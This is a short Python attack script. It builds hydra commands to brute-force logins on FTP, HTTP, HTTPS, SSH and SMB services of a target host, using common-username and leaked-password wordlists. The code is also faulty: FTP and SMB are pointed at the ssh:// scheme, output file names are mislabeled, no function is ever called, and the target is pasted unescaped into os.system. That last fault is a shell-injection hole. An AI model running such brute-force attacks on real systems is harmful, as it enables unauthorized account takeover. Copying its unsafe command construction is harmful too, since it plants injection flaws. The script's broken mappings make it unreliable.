#!/usr/bin/python

import sys, os, time
target = str(sys.argv[1])

def bforce_ftp(ftp_target):
	cmd500 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "hydra_ftp.txt" ssh://' + ftp_target
	os.system(cmd500)

def bforce_http(http_target):
	cmd510 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "hydra_http.txt" http://' + http_target
	os.system(cmd510)

def bforce_https(https_target):
	cmd520 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 443 -o "hydra_http.txt" https://' + https_target
	os.system(cmd520)
  
def bforce_ssh(ssh_target):
	cmd530 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "hydra_http.txt" ssh://' + ssh_target
	os.system(cmd530)  
  
def bforce_smb(smb_target):
	cmd540 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 139 -o "hydra_http.txt" ssh://' + smb_target
	os.system(cmd540)  
